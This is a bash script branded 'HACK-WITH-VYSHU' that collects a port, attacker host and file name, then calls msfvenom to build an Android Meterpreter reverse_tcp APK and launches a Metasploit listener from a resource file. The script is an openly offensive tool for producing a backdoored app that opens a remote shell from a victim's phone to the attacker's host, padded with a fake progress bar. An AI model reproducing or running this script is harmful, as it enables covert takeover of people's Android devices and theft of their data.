#!/bin/bash
apt-get install neofetch -y && clear && neofetch

sleep 2

echo -e " \e[5m \e[1m----\e[40;38;5;82mHACK-WITH-VYSHU-----\e[25m\e[0m " | pv -qL 8
echo " "

echo -e "\e[92mAndroid Payload GEnarator"

echo " "
printf " \e[1;31;42m LPort for payload  \e[0m \e[40;38;5;82m====> \e[0m" | pv -qL 8

read port
echo " "

printf " \e[1;31;42m LHost for payload  \e[0m \e[40;38;5;82m====> \e[0m" | pv -qL 8

read lhost
echo " "

printf " \e[1;31;42m LHost for Listener \e[0m \e[40;38;5;82m====> \e[0m" | pv -qL 8

read lhost1
echo " "

printf " \e[1;31;42m Name for Payload   \e[0m \e[40;38;5;82m====> \e[0m " | pv -qL 8

read name
echo " "

printf " \e[101m\e[1;73m _-_-_-_ WAIT PAYlOAD to Generator _-_-_-_ \e[0m" 
echo " "
msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$port -o  $name.apk

printf " \e[101m\e[1;73m WAIT METASPLOIT IS RUNNING \e[0m\n"
clear 
echo "-------Wait For The Listener To Start------- " | pv -ql 10
sleep 2
echo "==> 5%"
sleep 2
echo "====>25%"
sleep 2
echo "======>50%"
sleep 2
echo "========>75%"
sleep 2
echo "=========>99.1%"
sleep 2
echo "===========100%>"
clear 
sed -e "s/\$lhost/$lhost1/" meterpreter.rc > $name.rc
msfconsole -r $name.rc
